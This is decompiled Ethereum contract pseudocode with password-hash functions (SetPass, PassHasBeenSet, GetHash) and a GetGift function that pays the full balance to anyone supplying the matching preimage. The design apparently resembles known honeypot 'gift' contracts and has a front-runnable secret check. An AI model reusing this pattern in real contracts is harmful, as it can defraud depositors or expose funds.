contract main {


// =======================  Init code  ======================


uint8 stor0;

function _fallback() payable {
    stor0 = 0
    require not msg.value
    return code.data[56 len 899]
}



// =====================  Runtime code  =====================


uint8 stor0;
uint256 hashPass;

function hashPass() {
    return hashPass
}

function _fallback() payable {
  stop
}

function PassHasBeenSet(bytes32 arg1) {
    if arg1 == hashPass:
        stor0 = 1
}

function SetPass(bytes32 arg1) payable {
    if not stor0:
        if msg.value >= 10^18:
            hashPass = arg1
}

function GetHash(bytes arg1) {
    mem[128 len arg1.length] = arg1[all]
    mem[ceil32(arg1.length) + 128 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
    mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32] = mem[floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
    mem[ceil32(arg1.length) + 128] = sha3(call.data[arg1 + 36 len floor32(arg1.length)], mem[ceil32(arg1.length) + floor32(arg1.length) + 128 len arg1.length % 32])
    return memory
      from ceil32(arg1.length) + 128
       len 32
}

function GetGift(bytes arg1) payable {
    mem[128 len arg1.length] = arg1[all]
    mem[ceil32(arg1.length) + 128 len floor32(arg1.length)] = call.data[arg1 + 36 len floor32(arg1.length)]
    mem[ceil32(arg1.length) + floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32] = mem[floor32(arg1.length) + -(arg1.length % 32) + 160 len arg1.length % 32]
    if hashPass == sha3(call.data[arg1 + 36 len floor32(arg1.length)], mem[ceil32(arg1.length) + floor32(arg1.length) + 128 len arg1.length % 32]):
        call msg.sender with:
           value eth.balance(this.address) wei
             gas 2300 * is_zero(value) wei
        require ext_call.success
}



}
